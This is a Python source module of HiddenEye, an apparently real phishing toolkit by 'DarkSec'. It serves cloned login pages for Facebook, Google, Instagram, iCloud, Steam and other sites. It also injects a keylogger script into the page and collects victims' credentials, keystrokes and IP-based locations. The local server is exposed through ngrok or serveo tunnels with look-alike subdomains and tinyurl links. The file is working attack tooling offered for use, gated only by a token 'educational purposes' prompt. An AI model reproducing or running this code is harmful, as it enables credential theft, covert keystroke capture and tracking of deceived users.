#Any actions must be here

from os import system, path
from distutils.dir_util import copy_tree
from time import sleep
import re
import json
from urllib.request import urlopen
from subprocess import check_output, CalledProcessError
from sys import stdout, argv
from Defs.Configurations import ConfigurationManager
from Defs.Languages import LocalizationManager

RED, WHITE, CYAN, GREEN, DEFAULT = '\033[91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'

LocalizationManager.installGetText()
LocalizationManager.languageSelector()
ConfigurationManager.ifSettingsNotExists()
config = ConfigurationManager.readConfig()

logFile = None
didBackground = config.get("Settings","DidBackground")
for arg in argv:
	if arg=="--nolog": #If true - don't log
		didBackground = False
if config.get("Settings", "DidBackground") == "True":
	logFile = open("log.txt", "w")

class InterfaceManager:
	"""Main Interface Actions Class"""
	def runPhishing(page , customOption): #Phishing pages selection menu
		system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/')
		if customOption == '1' and page == 'Facebook':
			copy_tree("WebPages/fb_standard/", "Server/www/")
		if customOption == '2' and page == 'Facebook':
			copy_tree("WebPages/fb_advanced_poll/", "Server/www/")
		if customOption == '3' and page == 'Facebook':
			copy_tree("WebPages/fb_security_fake/", "Server/www/")
		if customOption == '4' and page == 'Facebook':
			copy_tree("WebPages/fb_messenger/", "Server/www/")
		elif customOption == '1' and page == 'Google':
			copy_tree("WebPages/google_standard/", "Server/www/")
		elif customOption == '2' and page == 'Google':
			copy_tree("WebPages/google_advanced_poll/", "Server/www/")
		elif customOption == '3' and page == 'Google':
			copy_tree("WebPages/google_advanced_web/", "Server/www/")
		elif page == 'LinkedIn':
			copy_tree("WebPages/linkedin/", "Server/www/")
		elif page == 'GitHub':
			copy_tree("WebPages/GitHub/", "Server/www/")
		elif page == 'StackOverflow':
			copy_tree("WebPages/stackoverflow/", "Server/www/")
		elif page == 'WordPress':
			copy_tree("WebPages/wordpress/", "Server/www/")
		elif page == 'Twitter':
			copy_tree("WebPages/twitter/", "Server/www/")
		elif page == 'Snapchat':
			copy_tree("WebPages/Snapchat_web/", "Server/www/")
		elif page == 'Yahoo':
			copy_tree("WebPages/yahoo_web/", "Server/www/")
		elif page == 'Twitch':
			copy_tree("WebPages/twitch/", "Server/www/")
		elif page == 'Microsoft':
			copy_tree("WebPages/live_web/", "Server/www/")
		elif page == 'Steam':
			copy_tree("WebPages/steam/", "Server/www/")
		elif page == 'iCloud':
			copy_tree("WebPages/iCloud/", "Server/www/")
		elif customOption == '1' and page == 'Instagram':
			copy_tree("WebPages/Instagram_web/", "Server/www/")
		elif customOption == '2' and page == 'Instagram':
			copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
		elif customOption == '3' and page == 'Instagram':
			copy_tree("WebPages/Instagram_advanced_attack/", "Server/www/")
		elif customOption == '1' and page == 'VK':
			copy_tree("WebPages/VK/", "Server/www/")
		elif customOption == '2' and page == 'VK':
			copy_tree("WebPages/VK_poll_method/", "Server/www/")
	def runMainMenu(): #menu where user select what he wanna use

		if 256 != system('which php'): #Checking if user have PHP
			print (" -----------------------".format(CYAN, DEFAULT))
			print (_("[PHP INSTALLATION FOUND]").format(CYAN, DEFAULT))
			print (" -----------------------".format(CYAN, DEFAULT))
		else:
			print (_(" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again.http://www.php.net/").format(CYAN, DEFAULT))
			exit(0)

		for i in range(101):
			sleep(0.05)
			stdout.write("\r")
			stdout.write(_("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(RED, DEFAULT, i))
			stdout.flush()

		if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({2}y{1}/{0}n{1})\n{2}HiddenEye >>> {1}").format(CYAN, DEFAULT, RED)).upper() != 'Y': #Question where user must accept education purposes
			system('clear')
			print (_('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n\n').format(RED, DEFAULT))
			exit(0)

		system('clear')
		print (_('''


	{1}<=============================================================================>
	 ||                                                                         ||
	 || ██   ██ ██ ██████   ██████   ███████ ███   ██  {3}███████ ██    ██ ███████ {1}||
	 || ██   ██ ██ ██    ██ ██    ██ ██      ████  ██  {3}██       ██  ██  ██      {1}||
	 || ███████ ██ ██    ██ ██    ██ ███████ ██ ██ ██  {3}███████   ████   ███████ {1}||
	 || ██   ██ ██ ██    ██ ██    ██ ██      ██  ████  {3}██         ██    ██      {1}||
	 || ██   ██ ██ ██████   ██████   ███████ ██   ███  {3}███████    ██    ███████ {1}||
	 ||                                                                         ||
	 -----------------------------------------------------------------------------
														 v{3}0{1}.{3}2{1}.{3}3{1} BY:DARKSEC{2}
					 {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]
			 A KEYLOGGER WILL BE DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ]
	<=============================================================================>
												 ''').format(GREEN, DEFAULT, CYAN, RED))



		option = input(_("*************************\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n*************************\n {0}[{1}1{0}]{1} Facebook\n {0}[{1}2{0}]{1} Google\n {0}[{1}3{0}]{1} LinkedIn\n {0}[{1}4{0}]{1} GitHub\n {0}[{1}5{0}]{1} StackOverflow\n {0}[{1}6{0}]{1} WordPress\n {0}[{1}7{0}]{1} Twitter\n {0}[{1}8{0}]{1} Instagram\n {0}[{1}9{0}]{1} Snapchat\n {0}[{1}10{0}]{1} Yahoo\n {0}[{1}11{0}]{1} Twitch\n {0}[{1}12{0}]{1} Microsoft\n {0}[{1}13{0}]{1} Steam\n {0}[{1}14{0}]{1} VK\n {0}[{1}15{0}]{1} iCloud\n{0}HiddenEye >>>  {1}").format(RED, DEFAULT))
		if option == '1':
			InterfaceManager.loadModule('Facebook')
			customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
			InterfaceManager.runPhishing('Facebook', customOption)
		elif option == '2':
			InterfaceManager.loadModule('Google')
			customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
			InterfaceManager.runPhishing('Google', customOption)
		elif option == '3':
			InterfaceManager.loadModule('LinkedIn')
			customOption = ''
			InterfaceManager.runPhishing('LinkedIn', customOption)
		elif option == '4':
			InterfaceManager.loadModule('GitHub')
			customOption = ''
			InterfaceManager.runPhishing('GitHub', customOption)
		elif option == '5':
			InterfaceManager.loadModule('StackOverflow')
			customOption = ''
			InterfaceManager.runPhishing('StackOverflow', customOption)
		elif option == '6':
			InterfaceManager.loadModule('WordPress')
			customOption = ''
			InterfaceManager.runPhishing('WordPress', customOption)
		elif option == '7':
			InterfaceManager.loadModule('Twitter')
			customOption = ''
			InterfaceManager.runPhishing('Twitter', customOption)
		elif option == '8':
			InterfaceManager.loadModule('Instagram')
			customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
			InterfaceManager.runPhishing('Instagram', customOption)
		elif option == '9':
			InterfaceManager.loadModule('Snapchat')
			customOption = ''
			InterfaceManager.runPhishing('Snapchat', customOption)
		elif option == '10':
			InterfaceManager.loadModule('Yahoo')
			customOption = ''
			InterfaceManager.runPhishing('Yahoo', customOption)
		elif option == '11':
			InterfaceManager.loadModule('Twitch')
			customOption = ''
			InterfaceManager.runPhishing('Twitch', customOption)
		elif option == '12':
			InterfaceManager.loadModule('Microsoft')
			customOption = ''
			InterfaceManager.runPhishing('Microsoft', customOption)
		elif option == '13':
			InterfaceManager.loadModule('Steam')
			customOption = ''
			InterfaceManager.runPhishing('Steam', customOption)
		elif option == '14':
			InterfaceManager.loadModule('VK')
			customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n{0}HiddenEye >>> {1}").format(RED, DEFAULT))
			InterfaceManager.runPhishing('VK', customOption)
		elif option == '15':
			InterfaceManager.loadModule('iCloud')
			customOption = ''
			InterfaceManager.runPhishing('iCloud', customOption)
		else:
			exit(0)
	def loadModule(module): #This one just show text..
		   print (_(''' {0}
	 [{1}*{0}] module loaded. Building site...{0}\n--------------------------------''').format(RED, DEFAULT))
	def inputCustom(): #Question where user can input custom web-link
		 system('clear')
		 print(_('''
			{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
			|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
			|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
			{0}http://github.com/darksecdevelopers
			{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ]{1}!! {0}\n-------------------------------''').format(RED, DEFAULT))
		 print(_('''\n{1}**{0}(Choose Wisely As Your Victim Will Redirect to This Link)''').format(RED, DEFAULT))
		 print(_('''\n{1}**{0}(Leave Blank To Loop The Phishing Page)''').format(RED, DEFAULT))
		 print(_('''\n{0}[{1}/!\{0}]{0}Insert a custom redirect url:''').format(RED, DEFAULT))
		 custom = input(_('''\n{0}REDIRECT HERE>>> {1}''').format(RED, DEFAULT))
		 if 'http://' in custom or 'https://' in custom:
			 pass
		 else:
			 custom = 'http://' + custom
		 if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
			 with open('Server/www/login.php') as f:
				 read_data = f.read()
			 c = read_data.replace('<CUSTOM>', custom)
			 f = open('Server/www/login.php', 'w')
			 f.write(c)
			 f.close()
			 with open('Server/www/post.php') as f:
				 read_data = f.read()
			 c = read_data.replace('<CUSTOM>', custom)
			 f = open('Server/www/post.php', 'w')
			 f.write(c)
			 f.close()
		 else:
			 with open('Server/www/login.php') as f:
				 read_data = f.read()
			 c = read_data.replace('<CUSTOM>', custom)
			 f = open('Server/www/login.php', 'w')
			 f.write(c)
			 f.close()
	def keyloggerprompt():
		system('clear')
		print (_('''{1}
			_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
			|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
			|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
			{0}http://github.com/darksecdevelopers
			{0}** BY:DARKSEC **
	''').format(RED, DEFAULT))
		print(_("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------").format(RED, DEFAULT))
	def addingkeylogger():
		 custom = input(_("\n{1}Do you want to Deploy a Keylogger against Victim{0}(Y/N) \n\n{0}YOUR CHOICE (Y/N) >>> {1}").format(RED, DEFAULT))
		 if 'Y' in custom or 'y' in custom:
			 with open('Server/www/index.html') as f:
				 read_data = f.read()
			 c = read_data.replace('</title>', '</title><script src="keylogger.js"></script>')
			 f = open('Server/www/index.html', 'w')
			 f.write(c)
			 f.close()

			 print(_("\n\n{1}[{0}??{1}]{0} Keylogger Added {1}Successfully...\n").format(RED, DEFAULT))
			 sleep(7.5)

		 else:
			 pass
			 print(_("\n\n{1}[{0}!!{1}]{0} Keylogger {1}Not Added{0}... \n").format(RED, DEFAULT))
			 sleep(7.0)
	def getCredentials():



		print(_("{0}[{1}*{0}]{1} Waiting for credentials//Keystrokes//Victim's device info. \n").format(CYAN, DEFAULT))
		while True:
			with open('Server/www/usernames.txt') as creds:
				lines = creds.read().rstrip()
				if len(lines) != 0:
					writeLog('======================================================================'.format(RED, DEFAULT))
					writeLog(_(' {0}[ CREDENTIALS FOUND ]{1}:\n {0}{2}{1}').format(GREEN, DEFAULT, lines))
					system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
					writeLog('======================================================================'.format(RED, DEFAULT))

			creds.close()


			with open('Server/www/ip.txt') as creds:
				lines = creds.read().rstrip()
				if len(lines) != 0:
					ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
					user = re.match('Current logged in user: (a-z0-9)\n', lines)
					resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
					ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
					if 'bogon' in ipinfo:
						log('======================================================================'.format(RED, DEFAULT))
						log(_(' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}{2}{1}').format(GREEN, DEFAULT, lines))
					else:
						matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
						latitude = matchObj.group(1)
						longitude = matchObj.group(2)
						writeLog('======================================================================'.format(RED, DEFAULT))
						writeLog(_(' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}{2}{1}').format(GREEN, DEFAULT, lines))
						writeLog(_(' \n{0}Longitude: {2} \nLatitude: {3}{1}').format(GREEN, DEFAULT, longitude, latitude))
						writeLog(_(' \n{0}ISP: {2} \nCountry: {3}{1}').format(GREEN, DEFAULT, ipinfo['org'], ipinfo['country']))
						writeLog(_(' \n{0}Region: {2} \nCity: {3}{1}').format(GREEN, DEFAULT, ipinfo['region'], ipinfo['city']))
					system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
					writeLog('======================================================================'.format(RED, DEFAULT))

			creds.close()

			with open('Server/www/KeyloggerData.txt') as creds:
				lines = creds.read().rstrip()
				if len(lines) != 0:
					writeLog('_______________________________'.format(RED, DEFAULT))
					writeLog(_(' {0}[ GETTING PRESSED KEYS ]{1}:\n {0}%s{1}').format(GREEN, DEFAULT) % lines)
					system('rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
					writeLog('_______________________________'.format(RED, DEFAULT))


			creds.close()
	def writeLog(ctx): #Writing log
		if config.get("Settings", "DidBackground") == "True": #if didBackground == True, write
			logFile.write(ctx.replace(RED, "").replace(WHITE, "").replace(CYAN, "").replace(GREEN, "").replace(DEFAULT, "") + "\n")
			print(ctx)
	def endMessage(): #Message when HiddenEye exit
		system('clear')
		print (_('''
						 {1}_....~~~~=====~~~~...._
					  .'========={3}/----=\{1}=========>
					/:========={3}/-----====\{1}
				   |=========={3}|-----======|{1}==========>
					\:========={3}\---======/{1}
					  \=========={3}\=====/{1}==========>
						 ````~~~~=======~~~~````

					  {3}HIDDEN EYE {3}BY: DARKSEC TEAM
	 {0}THANKS FOR USING IT.IF YOU LIKE IT THEN, HELP US WE NEED MORE SUPPORT.
				{3}https://github.com/DarkSecDevelopers/HiddenEye     ''').format(GREEN, DEFAULT, CYAN, RED))


class ServerManager:
	"""Server management"""
	def selectServer(): #Question where user must select server
				system('clear')
				print(_('''
				{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
				|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
				|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
				{0}http://github.com/darksecdevelopers
				{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(RED, DEFAULT))
				print(_("\n {0}[{1}!{0}]{0}SERVEO IS MORE ADVANCED THAN NGROK.\n {0}[{1}!{0}]{0}STILL ITS YOUR CHOICE{1}").format(RED, DEFAULT))
				print(_("\n {0}[{1}*{0}]{0}Select Any Available Server:{1}").format(RED, DEFAULT))
				print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo").format(RED, DEFAULT))

				choice = input(" \n{0}HiddenEye >>> {1}".format(RED, DEFAULT))
				system('clear')
				if choice == '1':

					ServerManager.runNgrok()
				elif choice == '2':
					ServerManager.runServeo()
				else:
					system('clear')
					return ServerManager.selectServer()
	def runNgrok():
			system('./Server/ngrok http 1111 > /dev/null &')
			while True:
				sleep(2)
				system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
				urlFile = open('ngrok.url', 'r')
				url = urlFile.read()
				urlFile.close()
				if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
					print('''
				{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
				|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
				|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
				{0}http://github.com/darksecdevelopers
				{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ ATTACK IS IN PROGRESS ]{1}!! {0}\n-------------------------------\n\n\n {0}[{1}*{0}]{1} Ngrok URL: {2}'''.format(RED, DEFAULT, GREEN) + url + '''{1}'''.format(RED, DEFAULT, GREEN))
					link = check_output("curl -s 'http://tinyurl.com/api-create.php?url='"+url, shell=True).decode().replace('http', 'https')
					print('''\n {0}[{1}*{0}]{1} TINYURL: {2}'''.format(RED, DEFAULT, GREEN) + link + '''{1}'''.format(RED, DEFAULT, GREEN))
					print('''\n''')
					break
	def runServeo():

			print(_('''
				{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
				|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
				|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
				{0}http://github.com/darksecdevelopers
				{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n\n\n{0}[{1}!{0}]{1}[ YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL's ]\n{0}[{1}!{0}]{1}Again ? Use Your Social-engineering Skills Here.\n\n\n{0}Insert a custom subdomain for serveo''').format(RED, DEFAULT))
			lnk = input(_("\n{0}CUSTOM Subdomain>>> {1}").format(RED, DEFAULT))
			if not ".serveo.net" in lnk:
				lnk += ".serveo.net"
			else:
				pass
			system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R %s:80:localhost:1111 serveo.net > link.url 2> /dev/null &' % (lnk))
			sleep(7)
			try:
				output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",shell=True)
				url = str(output).strip("b ' \ n r")
				print("\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
				print("\n")
				data = urlopen("http://tinyurl.com/api-create.php?url="+url)
				url = data.read()
				link = url.decode('utf-8')
				print("\n{0}[{1}*{0}]{1} TINYURL: {2}".format(RED, DEFAULT, GREEN) + link + "{1}".format(RED, DEFAULT, GREEN))
				print("\n")
			except CalledProcessError:
				print (_('''\n\n{0}FAILED !!!...{1}FAILED !!!..{0}FAILED !!!\n\n{0}[{1}!{0}]{0} Please Make Sure:\n{1} 1)~ If You are still connected to the Internet.\n 2)~ If You Have Chosen A {0}Valid{0}{1} Custom URL. \n     As Serveo Implemented More Security To Stop misuse of the service.\n 3)~ You Can Give another Try.\n\n\n{0}SCRIPT STOPPED {1}!! \n
		''').format(RED, DEFAULT))
				exit(0)
	def runServer():
			system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")